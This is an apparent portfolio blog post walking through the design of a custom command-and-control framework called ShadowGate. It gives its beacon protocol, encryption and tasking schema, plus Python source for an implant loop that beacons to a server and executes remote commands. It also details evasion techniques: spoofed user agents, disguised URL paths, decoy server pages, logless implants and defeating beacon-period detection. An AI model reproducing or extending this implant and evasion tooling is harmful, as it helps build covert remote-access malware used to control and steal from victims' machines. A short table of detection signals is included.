# C2 Architecture — Building a Minimal C2 Framework

> 📅 Portfolio date: **September 15, 2025**

---

## Design Constraints

Every C2 framework makes trade-offs between stealth, reliability, and feature depth. For ShadowGate, the constraints were:

- **All beaconing over HTTPS** — HTTP/S blends into baseline web traffic. DNS tunneling is slower and more detectable by modern DNS monitoring.
- **AES-256-GCM encryption** — Authenticated encryption prevents both eavesdropping and tampering. GCM provides integrity verification built in.
- **Jittered beacon intervals** — Fixed intervals are trivial to detect via periodic beacon analysis. Random deltas around a mean interval defeat simple statistical detection.
- **Serverless implant** — The implant (agent) has no listening ports. All communication is outbound from the target. This defeats ingress filtering and port-based detection.

## Protocol Design

```
┌─────────┐    HTTPS POST /beacon    ┌─────────┐
│ Implant │ ──────────────────────→  │  C2     │
│ (agent) │     encrypted JSON       │ Server  │
│         │ ←──────────────────────  │         │
│         │   tasks or heartbeat     │         │
└─────────┘                          └─────────┘
```

### Beacon Structure

```json
{
  "beacon": {
    "id": "a1b2c3d4-e5f6-...",
    "timestamp": 1734567890.123,
    "counter": 42,
    "body": "<AES-GCM ciphertext (base64)>",
    "iv": "<12-byte IV (base64)>"
  }
}
```

The **counter** is a monotonic sequence number that prevents replay attacks. The server rejects any beacon with a counter ≤ the last seen value for that implant ID.

**Encrypted body** (before wrapping in the beacon envelope):

```json
{
  "type": "checkin",
  "hostname": "WORKSTATION-42",
  "username": "<user>",
  "os": "Windows 10 22H2",
  "elevated": false,
  "pid": 8402
}
```

The server decrypts the body, evaluates the implant's state, and returns a response:

```json
{
  "type": "response",
  "tasks": [
    {
      "id": "task-001",
      "command": "exec",
      "payload": "<encrypted command bytes>",
      "timeout": 30
    }
  ],
  "sleep": 45,
  "jitter": 0.2
}
```

The implant sleeps for `sleep ± sleep*jitter` seconds before the next beacon, i.e., 36–54 seconds for a 45s base with 20% jitter.

---

## Encryption: AES-256-GCM

GCM was chosen over CBC + HMAC because it combines encryption and authentication in a single pass.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os, base64

class Crypto:
    def __init__(self, key_hex: str):
        self.key = bytes.fromhex(key_hex)

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        iv = os.urandom(12)  # 96-bit IV for GCM
        aesgcm = AESGCM(self.key)
        ciphertext = aesgcm.encrypt(iv, plaintext, None)
        return iv, ciphertext

    def decrypt(self, iv: bytes, ciphertext: bytes) -> bytes:
        aesgcm = AESGCM(self.key)
        return aesgcm.decrypt(iv, ciphertext, None)
```

**Key rotation**: each implant generates a new key pair on initial registration. The public key is sent in the clear during registration; all subsequent communication uses the negotiated session key. This means a compromised key only affects one session.

---

## Tasking Model

Tasks are stored server-side in a queue per implant. On each beacon, pending tasks are dispatched.

```python
# Server-side task definition (SQLite-backed)
TASKS_SCHEMA = """
CREATE TABLE tasks (
    id TEXT PRIMARY KEY,
    implant_id TEXT NOT NULL,
    command TEXT NOT NULL,       -- 'exec', 'upload', 'download', 'sleep', 'exit'
    payload BLOB,               -- encrypted payload bytes
    status TEXT DEFAULT 'pending',  -- pending, dispatched, completed, failed
    result BLOB,                -- encrypted result bytes
    created_at REAL,
    completed_at REAL
);
"""
```

| Command | Description | Payload |
|---------|-------------|---------|
| `exec` | Run shell command | Command string (encrypted) |
| `upload` | Upload file to implant | File path + content (encrypted) |
| `download` | Download file from implant | Target path (encrypted) |
| `sleep` | Change beacon interval | New interval in seconds |
| `exit` | Terminate implant | None |

Each task response includes stdout, stderr, exit code, and duration:

```json
{
  "id": "task-001",
  "status": "completed",
  "stdout": "dG90YWwgNjk2MAo=",    // base64
  "stderr": "",
  "exit_code": 0,
  "duration_ms": 1423
}
```

Results are encrypted with the session key before transmission.

---

## OpSec Considerations

### Beacon Fingerprinting

HTTP beacon headers should mimic legitimate user agents:

```python
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 ...",
]
```

The beacon URL should use realistic paths: `/api/v2/analytics/events`, `/auth/check`, `/cdn/config`, not `/beacon` or `/c2`.

### Server Obfuscation

The C2 server presents as a legitimate service. A landing page returns a 404 or a fabricated API response. Only requests with the correct UUID path segment are routed to the C2 handler.

### Logging

The implant writes no logs. All persistence is on the server side. If the implant is discovered, there's no local record of past commands or results.

---

## Detection Opportunities

Understanding how defenders see your C2 is part of building one:

| Signal | Detection Mechanism |
|--------|-------------------|
| Periodic HTTPS to unusual domain | Beacon period analysis (time-series) |
| AES-GCM nonce reuse | Cryptographic analysis of captured traffic |
| JA3/S fingerprinting | TLS client hello fingerprint mismatch |
| Process creation chain | `rundll32.exe → powershell.exe` anomalous parent |
| DNS A records for C2 domain | Passive DNS monitoring |

ShadowGate mitigates these via jittered intervals (defeats period analysis), per-beacon unique IVs (prevents nonce reuse), and in-memory execution (reduces process tree anomalies).

---

## Source: Core Implant Loop

```python
import requests, time, json, os, random
from base64 import b64encode, b64decode

class Implant:
    def __init__(self, c2_url, crypto):
        self.c2_url = c2_url
        self.crypto = crypto
        self.session = requests.Session()
        self.beacon_counter = 0

    def beacon(self):
        self.beacon_counter += 1
        body = self._collect_system_info()
        iv, ct = self.crypto.encrypt(json.dumps(body).encode())
        packet = {
            "beacon": {
                "id": self.id,
                "counter": self.beacon_counter,
                "iv": b64encode(iv).decode(),
                "body": b64encode(ct).decode(),
            }
        }
        try:
            resp = self.session.post(
                self.c2_url + "/api/v3/config/check",
                json=packet,
                timeout=15,
                headers={"User-Agent": random.choice(USER_AGENTS)}
            )
            return self._handle_response(resp.json())
        except requests.RequestException:
            pass  # silent failure; next beacon will retry

    def _handle_response(self, data):
        iv = b64decode(data["iv"])
        ct = b64decode(data["body"])
        plain = json.loads(self.crypto.decrypt(iv, ct))
        for task in plain.get("tasks", []):
            self._execute_task(task)
        delay = plain.get("sleep", 60)
        jitter = plain.get("jitter", 0.2)
        return delay * (1 + random.uniform(-jitter, jitter))

    def run(self):
        while True:
            sleep_time = self.beacon()
            time.sleep(max(sleep_time, 1))
```

The implant loop is intentionally minimal. The core logic is response handling and task execution — everything else is noise management.

---
*Originally published on [saranx.hashnode.dev/c2-framework](https://saranx.hashnode.dev/c2-framework) on **July 24, 2026***
